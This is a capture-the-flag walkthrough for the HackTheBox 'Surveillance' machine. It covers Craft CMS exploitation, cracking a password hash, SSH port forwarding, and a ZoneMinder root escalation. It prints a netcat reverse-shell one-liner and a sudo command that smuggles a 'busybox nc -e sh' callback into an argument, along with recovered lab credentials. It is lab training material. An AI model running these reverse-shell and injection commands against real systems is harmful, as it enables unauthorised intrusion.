---
title: HackTheBox - Surveillance
categories: [Red Team, HackTheBox]
tags: [web, fuzz, ffuf, hashCrack, htb-medium, linux, privesc, portForwarding]
author: Jenil
image: assets/images/HackTheBox-Surveillance/Surveillance.png
---


#### Nmap scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User

Look for /admin page and here Craft CMS is being used. Identify version of Craft CMS as 4.4.14 from source code.

Look for exploit/PoC and run it.
After getting shell, Get stable reverse shell:
```console
$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.x.x 4444 >/tmp/f
```


Look for "surveillance--2023-10-17-202801--v4.4.14.sql.zip" file.
Unzip and look for database entry of user "Matthew" and retrieve his password hash "39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec".
This is SHA-256 hash by analyzing the hash on online hash identifier.
Password can be cracked with JohnTheRipper, which is "starcraft122490".

SSH into machine as matthew user and get user flag.

## Root

We will now run linpeas to get some hardcoded passwords.

I got "craftuser : CraftCMSPassword2023!" as mysql database credentials but I was not able to login into the database.

We can get "ZoneMinderPassword2023" password from linpeas output.

![Zoneminder config](/assets/images/HackTheBox-Surveillance/zoneminder_config.png)
This is some kind of config file for "Zoneminder" which is a software for monitoring.

Now, we can do portforwarding using SSH.

```console
$ ssh -L 4545:127.0.0.1:8080 matthew:10.10.11.245
```

Visit 127.0.0.1:4545, we can see login page for zoneminder, I used all of the credentials that I found so far but no luck.

So, while looking for exploit/PoC, I got one for CVE-2023-26035.

By running this PoC, we can shell as a user zoneminder and can use command `sudo -l` to see which commands this user can use as sudo.

```
Matching Defaults entries for zoneminder on surveillance:
env_reset, mail_badpass,	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binuse_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

There are so many files in /usr/share/zm*.pl but we can run zmupdate.pl to get root shell.

```console
$ sudo /usr/bin/zmupdate.pl — version=1 — user=’$(busybox nc 10.10.XX.XX 7777 -e sh)’ —pass=ZoneMinderPassword2023
```

Listen on netcat and boom we got reverse shell as root!!!
Retrieve root flag.
